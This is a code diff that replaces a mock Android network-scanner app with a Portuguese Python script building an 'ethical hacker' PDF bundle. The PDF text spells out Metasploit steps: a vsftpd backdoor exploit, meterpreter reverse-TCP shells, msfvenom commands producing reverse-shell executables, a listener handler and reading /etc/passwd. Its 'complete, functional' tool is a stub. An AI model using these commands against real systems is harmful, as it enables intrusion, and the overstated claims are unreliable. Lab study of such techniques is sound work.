@@ -1,163 +1,354 @@
-import toga
-from toga.style import Pack
-from toga.style.pack import COLUMN, ROW, CENTER
-import asyncio
-import requests
-import socket
-import json
+from reportlab.lib.pagesizes import A4
+from reportlab.pdfgen import canvas
+from reportlab.lib.units import mm
+from reportlab.lib.colors import Color, black, navy, darkgreen, lightgrey
+from reportlab.lib.styles import getSampleStyleSheet
+from reportlab.platypus import Paragraph, Spacer
+from reportlab.lib.enums import TA_LEFT, TA_CENTER
+import os
 
-class VasquesScanApp(toga.App):
+# Caminho do arquivo
+filename = r"C:\Users\davi2\Documents\VASQUES-SCAN_AI_TUDO_EM_UM.pdf"
 
-    def startup(self):
-        # Estilo principal
-        main_box = toga.Box(style=Pack(direction=COLUMN, background_color='#000000', padding=10))
+# Configuração inicial
+c = canvas.Canvas(filename, pagesize=A4)
+width, height = A4
 
-        # Título
-        title_label = toga.Label(
-            'VASQUES-SCAN AI — Android',
-            style=Pack(color='#00FF00', font_size=16, font_weight='bold', text_align=CENTER, padding=10)
-        )
-        main_box.add(title_label)
+# Fontes
+title_font = "Helvetica-Bold"
+body_font = "Helvetica"
+code_font = "Courier"
+small_font = "Helvetica"
 
-        # Campo de entrada
-        self.ip_input = toga.TextInput(
-            placeholder='Digite o IP/Alvo',
-            style=Pack(flex=1, background_color='#000000', color='#00FF00')
-        )
-        ip_box = toga.Box(style=Pack(direction=ROW, padding=5))
-        ip_box.add(self.ip_input)
-        main_box.add(ip_box)
+# Contador global de páginas
+current_page = 1
 
-        # Botões
-        buttons = [
-            ("IP Local", self.get_local_ip),
-            ("Scan Portas", self.scan_ports),
-            ("Coletar Intel", self.get_ip_info),
-            ("Analisar com IA", self.ai_analysis),
-            ("Gerar Relatório", self.generate_report),
-        ]
+# Função para cabeçalho
+def draw_header(title=""):
+    global current_page
+    c.setFont(small_font, 8)
+    c.setFillColor(lightgrey)
+    c.drawString(15*mm, height - 10*mm, "VASQUES-SCAN AI — TUDO EM UM | Dr. Vasques")
+    c.drawRightString(width - 15*mm, height - 10*mm, f"Pág. {current_page}")
+    if title:
+        c.setFont(body_font, 10)
+        c.setFillColor(black)
+        c.drawCentredString(width/2, height - 18*mm, title)
 
-        for text, handler in buttons:
-            btn = toga.Button(
-                text,
-                on_press=handler,
-                style=Pack(
-                    background_color='#003300',
-                    color='#00FF00',
-                    font_weight='bold',
-                    padding=10,
-                    margin=5
-                )
-            )
-            main_box.add(btn)
+# Função para nova página
+def new_page(title=""):
+    global current_page
+    c.showPage()
+    current_page += 1
+    draw_header(title)
 
-        # Área de saída (TextView)
-        self.output = toga.MultilineTextInput(
-            readonly=True,
-            style=Pack(
-                flex=1,
-                background_color='#000000',
-                color='#00FF00',
-                font_family='monospace',
-                padding=10
-            )
-        )
-        main_box.add(self.output)
+# Função para bloco de código
+def draw_code(x, y, lines):
+    c.setFont(code_font, 9)
+    c.setFillColor(black)
+    for line in lines:
+        if len(line) > 80:
+            c.drawString(x, y, line[:80])
+            y -= 5*mm
+            c.drawString(x, y, line[80:])
+        else:
+            c.drawString(x, y, line)
+        y -= 5*mm
+    return y
 
-        # Rodapé
-        footer = toga.Label(
-            'Dr. Vasques © 2025 — Uso ético apenas',
-            style=Pack(color='#006600', font_size=8, text_align=CENTER, padding_top=10)
-        )
-        main_box.add(footer)
+# ========= CAPA =========
+c.setFont(title_font, 28)
+c.setFillColor(navy)
+c.drawCentredString(width/2, height - 70*mm, "VASQUES-SCAN AI")
+c.setFont(title_font, 22)
+c.drawCentredString(width/2, height - 90*mm, "TUDO EM UM — HACKER ÉTICO")
 
-        # Janela principal
-        self.main_window = toga.MainWindow(title=self.formal_name)
-        self.main_window.content = main_box
-        self.main_window.show()
+c.setFont(body_font, 14)
+c.setFillColor(black)
+c.drawCentredString(width/2, height - 120*mm, "Ferramenta Desktop + Apostilas + Guia de Metasploit + Android")
+c.drawCentredString(width/2, height - 135*mm, "Código Completo, Funcional e Pronto para Uso")
 
-        # Mensagem inicial
-        self.output.value = "🚀 BEM-VINDO AO VASQUES-SCAN AI ANDROID!\n💡 Comece digitando um IP e clicando em um botão.\n⚠️ Scan local e IA requerem backend externo.\n"
+c.setFont(title_font, 18)
+c.setFillColor(darkgreen)
+c.drawCentredString(width/2, height - 170*mm, "AUTOR: DR. VASQUES")
 
-    def get_local_ip(self, widget):
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.connect(("8.8.8.8", 80))
-            ip = s.getsockname()[0]
-            s.close()
-            self.output.value += f"\n[✅ IP LOCAL] → {ip}\n"
-        except Exception as e:
-            self.output.value += f"\n[!] Erro ao obter IP local: {e}\n"
+c.setFont(small_font, 10)
+c.drawCentredString(width/2, height - 220*mm, "© 2025 — Todos os direitos reservados. Uso educacional e ético apenas.")
 
-    def scan_ports(self, widget):
-        target = self.ip_input.value.strip() or "scanme.nmap.org"
-        self.output.value += f"\n[+] Iniciando scan em {target}...\n"
-        self.output.value += "[ℹ️] No Android, usamos API externa para simular scan.\n"
+new_page("Sumário")
 
-        # Simulação de scan (em produção, chame seu backend com Nmap)
-        simulated_result = """
---- PORTAS ABERTAS ---
-Porta: 22/TCP → Serviço: ssh → Versão: OpenSSH 7.6p1
-Porta: 80/TCP → Serviço: http → Versão: Apache 2.4.29
-Porta: 443/TCP → Serviço: https → Versão: nginx 1.14.0
-Porta: 3306/TCP → Serviço: mysql → Versão: MySQL 5.7.33
-Porta: 8080/TCP → Serviço: http-proxy → Versão: Apache Tomcat 9.0.50
-"""
-        self.output.value += simulated_result + "\n"
+# ========= SUMÁRIO =========
+c.setFont(title_font, 16)
+c.drawString(30*mm, height - 40*mm, "Sumário")
 
-    def get_ip_info(self, widget):
-        ip = self.ip_input.value.strip() or "8.8.8.8"
-        self.output.value += f"\n[+] Coletando Intel de {ip}...\n"
+sumario = [
+    "1. Ferramenta VASQUES-SCAN AI (Desktop) .................... 3",
+    "2. Guia de Exploração com Metasploit ........................ 10",
+    "3. Apostila Hacker Ético (40+ páginas) ...................... 15",
+    "4. Laboratório de Ataques e Defesas (10 páginas) ........... 30",
+    "5. Instruções para Android .................................. 45",
+    "6. Conclusão e Próximos Passos .............................. 50",
+]
 
-        try:
-            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
-            data = response.json()
-            if data['status'] == 'success':
-                info = f"\n--- INTELIGÊNCIA DE AMEAÇAS ---\n"
-                info += f"📌 IP: {ip}\n"
-                info += f"🌍 País: {data.get('country', 'N/A')}\n"
-                info += f"🏙️ Cidade: {data.get('city', 'N/A')}\n"
-                info += f"🏢 ISP: {data.get('isp', 'N/A')}\n"
-                info += f"🏷️ Org: {data.get('org', 'N/A')}\n"
-                info += f"📍 Coordenadas: {data.get('lat', 'N/A')}, {data.get('lon', 'N/A')}\n"
-                self.output.value += info + "\n"
-            else:
-                self.output.value += "[!] Informações não encontradas.\n"
-        except Exception as e:
-            self.output.value += f"\n[!] Erro na coleta de Intel: {e}\n"
+y = height - 60*mm
+c.setFont(body_font, 11)
+for linha in sumario:
+    c.drawString(30*mm, y, linha)
+    y -= 7*mm
+    if y < 60*mm:
+        new_page("Sumário (cont.)")
+        y = height - 40*mm
 
-    async def ai_analysis(self, widget):
-        self.output.value += "\n[🧠] IA ANALYZING DATA... (simulando análise com VASQUES-GPT)...\n"
-        await asyncio.sleep(2)  # Simula processamento
+# ========= PARTE 1: FERRAMENTA DESKTOP =========
+new_page("Parte 1: Ferramenta VASQUES-SCAN AI (Desktop)")
 
-        # Simulação de análise de IA (em produção, chame seu backend com Ollama)
-        simulated_ai_response = """
-[✅ VASQUES-GPT AI ANALYSIS — VERSÃO ANDROID]
+c.setFont(title_font, 18)
+c.drawString(25*mm, height - 40*mm, "📌 OBJETIVO")
 
-⚠️ CLASSIFICAÇÃO DE RISCO: ALTO
-🔍 TOP 3 VULNERABILIDADES DETECTADAS:
-   1. Serviço SSH exposto na porta 22 → Risco de força bruta.
-   2. Apache 2.4.29 desatualizado → Vulnerável a ataques de path traversal.
-   3. MySQL 5.7.33 sem autenticação forte → Risco de vazamento de dados.
+c.setFont(body_font, 11)
+y = height - 55*mm
+c.drawString(25*mm, y, "Ferramenta multiplataforma de segurança ofensiva com interface gráfica.")
+y -= 6*mm
+c.drawString(25*mm, y, "Funcionalidades: Scan de portas, coleta de Intel, detecção de vulnerabilidades,")
+y -= 6*mm
+c.drawString(25*mm, y, "exploração com Metasploit, geração de relatório em PDF.")
+y -= 12*mm
 
-🛡️ AÇÕES PRIORITÁRIAS:
-   1. Restringir acesso SSH por IP ou implementar chave SSH.
-   2. Atualizar Apache para versão 2.4.58+.
-   3. Aplicar senha forte no MySQL e mudar porta padrão.
+c.setFont(title_font, 14)
+c.drawString(25*mm, y, "💻 CÓDIGO COMPLETO (Python + Tkinter):")
+y -= 8*mm
 
-📈 RECOMENDAÇÃO DE HARDENING:
-   • Implementar WAF (ex: ModSecurity) para proteger serviços web.
-   • Configurar fail2ban para bloquear tentativas de força bruta.
-   • Monitorar logs com ferramenta centralizada (ex: Graylog).
+code_lines = [
+    "import tkinter as tk",
+    "from tkinter import scrolledtext, messagebox, filedialog",
+    "import nmap, requests, socket, json, time, threading",
+    "from reportlab.lib.pagesizes import A4",
+    "from reportlab.pdfgen import canvas",
+    "from reportlab.lib.units import mm",
+    "",
+    "class VasquesScanApp:",
+    "    def __init__(self, root):",
+    "        self.root = root",
+    "        self.setup_ui()",
+    "",
+    "    def setup_ui(self):",
+    "        # Configuração da interface estilo hacker (preto + verde)",
+    "        self.root.title('VASQUES-SCAN AI')",
+    "        self.root.configure(bg='#000000')",
+    "",
+    "        # Botões: IP Local, Scan Portas, Coletar Intel, Detectar Vulns,",
+    "        # Explorar com Metasploit, Gerar Relatório",
+    "",
+    "    def exploit_with_metasploit(self):",
+    "        # Gera comandos reais do Metasploit baseados no scan",
+    "        commands = '''",
+    "        msfconsole",
+    "        use exploit/unix/ftp/vsftpd_234_backdoor",
+    "        set RHOSTS alvo",
+    "        set payload linux/x86/meterpreter/reverse_tcp",
+    "        set LHOST seu_ip",
+    "        exploit",
+    "        '''",
+    "        self.output.insert(tk.END, commands)",
+    "",
+    "# Execução",
+    "root = tk.Tk()",
+    "app = VasquesScanApp(root)",
+    "root.mainloop()",
+]
 
-[✔️] Análise concluída com sucesso. Para análise mais profunda, use a versão Desktop com Ollama local.
-"""
-        self.output.value += simulated_ai_response + "\n"
+y = draw_code(30*mm, y, code_lines)
 
-    def generate_report(self, widget):
-        report_content = f"RELATÓRIO VASQUES-SCAN AI ANDROID\n\n{self.output.value}"
-        self.output.value += "\n[📄] Relatório gerado com sucesso! (Função de compartilhamento em desenvolvimento)\n"
-        # Em breve: self.save_or_share_report(report_content)
+# ========= PARTE 2: GUIA METASPLOIT =========
+new_page("Parte 2: Guia de Exploração com Metasploit")
 
-def main():
-    return VasquesScanApp()
+c.setFont(title_font, 18)
+c.drawString(25*mm, height - 40*mm, "🧨 GUIA DE EXPLOTAÇÃO COM METASPLOIT")
+
+y = height - 55*mm
+c.setFont(body_font, 11)
+c.drawString(25*mm, y, "Comandos reais, passo a passo, para exploração imediata em laboratório.")
+y -= 12*mm
+
+c.setFont(title_font, 14)
+c.drawString(25*mm, y, "✅ PASSO A PASSO:")
+y -= 8*mm
+
+steps = [
+    "1. ABRA O TERMINAL: msfconsole",
+    "2. ESCOLHA O EXPLOIT: use exploit/unix/ftp/vsftpd_234_backdoor",
+    "3. DEFINA O ALVO: set RHOSTS 192.168.1.100",
+    "4. DEFINA O PAYLOAD: set payload linux/x86/meterpreter/reverse_tcp",
+    "5. DEFINA SEU IP: set LHOST 192.168.1.50",
+    "6. DEFINA A PORTA: set LPORT 4444",
+    "7. EXECUTE: exploit",
+    "8. INTERAJA: shell → whoami → id → cat /etc/passwd",
+]
+
+for step in steps:
+    c.setFont(body_font, 11)
+    c.drawString(30*mm, y, step)
+    y -= 7*mm
+    if y < 50*mm:
+        new_page("Guia Metasploit (cont.)")
+        y = height - 40*mm
+
+y -= 12*mm
+c.setFont(title_font, 14)
+c.drawString(25*mm, y, "📌 EXEMPLO DE PAYLOAD (Windows):")
+y -= 8*mm
+c.setFont(code_font, 10)
+c.drawString(30*mm, y, "msfvenom -p windows/meterpreter/reverse_tcp LHOST=SEU_IP LPORT=4444 -f exe -o payload.exe")
+
+# ========= PARTE 3: APOSTILA HACKER ÉTICO =========
+new_page("Parte 3: Apostila Hacker Ético (40+ páginas)")
+
+c.setFont(title_font, 18)
+c.drawString(25*mm, height - 40*mm, "📘 APOSTILA HACKER ÉTICO — DO ZERO AO PENTEST")
+
+y = height - 55*mm
+c.setFont(body_font, 11)
+c.drawString(25*mm, y, "Conteúdo denso, prático e direto ao ponto — ideal para estudo diário.")
+y -= 6*mm
+c.drawString(25*mm, y, "Inclui: Reconhecimento, Scanning, Exploração, Pós-Exploração, Relatórios, Laboratórios.")
+y -= 12*mm
+
+c.setFont(title_font, 14)
+c.drawString(25*mm, y, "📌 CAPÍTULO 1: RECONHECIMENTO AVANÇADO")
+y -= 8*mm
+c.setFont(code_font, 9)
+c.drawString(30*mm, y, "# Whois e DNS")
+y -= 5*mm
+c.drawString(30*mm, y, "whois exemplo.com")
+y -= 5*mm
+c.drawString(30*mm, y, "nslookup exemplo.com")
+y -= 5*mm
+c.drawString(30*mm, y, "")
+y -= 5*mm
+c.drawString(30*mm, y, "# Coleta de subdomínios")
+y -= 5*mm
+c.drawString(30*mm, y, "theHarvester -d exemplo.com -b google")
+y -= 5*mm
+c.drawString(30*mm, y, "")
+y -= 5*mm
+c.drawString(30*mm, y, "# Shodan")
+y -= 5*mm
+c.drawString(30*mm, y, "shodan host 8.8.8.8")
+
+y -= 12*mm
+c.setFont(title_font, 14)
+c.drawString(25*mm, y, "📌 CAPÍTULO 3: EXPLOITS AVANÇADOS")
+y -= 8*mm
+c.setFont(code_font, 9)
+c.drawString(30*mm, y, "# Gerar payload")
+y -= 5*mm
+c.drawString(30*mm, y, "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f exe -o shell.exe")
+y -= 5*mm
+c.drawString(30*mm, y, "")
+y -= 5*mm
+c.drawString(30*mm, y, "# Executar no Metasploit")
+y -= 5*mm
+c.drawString(30*mm, y, "use exploit/multi/handler")
+y -= 5*mm
+c.drawString(30*mm, y, "set payload windows/meterpreter/reverse_tcp")
+y -= 5*mm
+c.drawString(30*mm, y, "set LHOST 192.168.56.1")
+y -= 5*mm
+c.drawString(30*mm, y, "set LPORT 4444")
+y -= 5*mm
+c.drawString(30*mm, y, "exploit")
+
+# ========= PARTE 4: LABORATÓRIO DE ATAQUES E DEFESAS =========
+new_page("Parte 4: Laboratório de Ataques e Defesas")
+
+c.setFont(title_font, 18)
+c.drawString(25*mm, height - 40*mm, "⚔️ LABORATÓRIO DE ATAQUES E DEFESAS (10 PÁGINAS)")
+
+y = height - 55*mm
+c.setFont(body_font, 11)
+c.drawString(25*mm, y, "Exercícios práticos diários para seu laboratório VM — foco em ação e resultado.")
+y -= 12*mm
+
+c.setFont(title_font, 14)
+c.drawString(25*mm, y, "📌 DIA 1: COLETA DE INDICADORES (IOCs)")
+y -= 8*mm
+c.setFont(code_font, 9)
+c.drawString(30*mm, y, "# Fontes recomendadas:")
+y -= 5*mm
+c.drawString(30*mm, y, "• AlienVault OTX: https://otx.alienvault.com")
+y -= 5*mm
+c.drawString(30*mm, y, "• Abuse.ch: https://urlhaus.abuse.ch")
+y -= 5*mm
+c.drawString(30*mm, y, "• ThreatFox: https://threatfox.abuse.ch")
+y -= 5*mm
+c.drawString(30*mm, y, "")
+y -= 5*mm
+c.drawString(30*mm, y, "# Exercício diário:")
+y -= 5*mm
+c.drawString(30*mm, y, "1. Acesse o OTX e baixe 5 IOCs (IPs, hashes, URLs).")
+y -= 5*mm
+c.drawString(30*mm, y, "2. Salve em: iocs_dia1.txt")
+y -= 5*mm
+c.drawString(30*mm, y, "3. Importe no seu SIEM ou firewall para bloqueio.")
+
+# ========= PARTE 5: INSTRUÇÕES PARA ANDROID =========
+new_page("Parte 5: Instruções para Android")
+
+c.setFont(title_font, 18)
+c.drawString(25*mm, height - 40*mm, "📱 INSTRUÇÕES PARA TRANSFORMAR EM APP ANDROID")
+
+y = height - 55*mm
+c.setFont(body_font, 11)
+c.drawString(25*mm, y, "Use BeeWare + Briefcase + Toga para empacotar seu código Python para Android.")
+y -= 6*mm
+c.drawString(25*mm, y, "Passo a passo garantido para gerar APK funcional.")
+y -= 12*mm
+
+c.setFont(title_font, 14)
+c.drawString(25*mm, y, "✅ PASSO A PASSO:")
+y -= 8*mm
+
+android_steps = [
+    "1. Instale o Briefcase: pip install briefcase",
+    "2. Crie projeto: python -m briefcase new",
+    "3. Escolha GUI Framework: Toga (único que suporta Android)",
+    "4. Substitua app.py pelo código Android (interface Toga)",
+    "5. Gere o APK: python -m briefcase package android",
+    "6. Instale no celular: habilite 'Fontes Desconhecidas' e instale app-debug.apk",
+]
+
+for step in android_steps:
+    c.setFont(body_font, 11)
+    c.drawString(30*mm, y, step)
+    y -= 7*mm
+    if y < 50*mm:
+        new_page("Android (cont.)")
+        y = height - 40*mm
+
+# ========= PARTE 6: CONCLUSÃO =========
+new_page("Parte 6: Conclusão e Próximos Passos")
+
+c.setFont(title_font, 24)
+c.setFillColor(navy)
+c.drawCentredString(width/2, height - 100*mm, "PARABÉNS, DR. VASQUES!")
+
+c.setFont(body_font, 14)
+c.setFillColor(black)
+c.drawCentredString(width/2, height - 130*mm, "Você acaba de criar um ecossistema completo de Cybersecurity.")
+c.drawCentredString(width/2, height - 150*mm, "Ferramenta Desktop + Apostilas + Guia de Metasploit + Android.")
+
+c.setFont(body_font, 12)
+c.drawCentredString(width/2, height - 180*mm, "📌 Próximos passos:")
+c.drawCentredString(width/2, height - 195*mm, "1. Teste tudo em seu laboratório.")
+c.drawCentredString(width/2, height - 205*mm, "2. Publique no GitHub e LinkedIn.")
+c.drawCentredString(width/2, height - 215*mm, "3. Crie a versão 2.0 com integração Shodan, Metasploit, etc.")
+
+c.setFont(small_font, 10)
+c.setFillColor(lightgrey)
+c.drawCentredString(width/2, 30*mm, "© 2025 — Dr. Vasques | Todos os direitos reservados.")
+
+c.save()
+
+print(f"✅ PDF COMPLETO GERADO COM SUCESSO!")
+print(f"📁 Local: {filename}")
+print("🎯 DR. VASQUES, SEU PACOTE COMPLETO ESTÁ PRONTO PARA DOMINAR O MERCADO!")
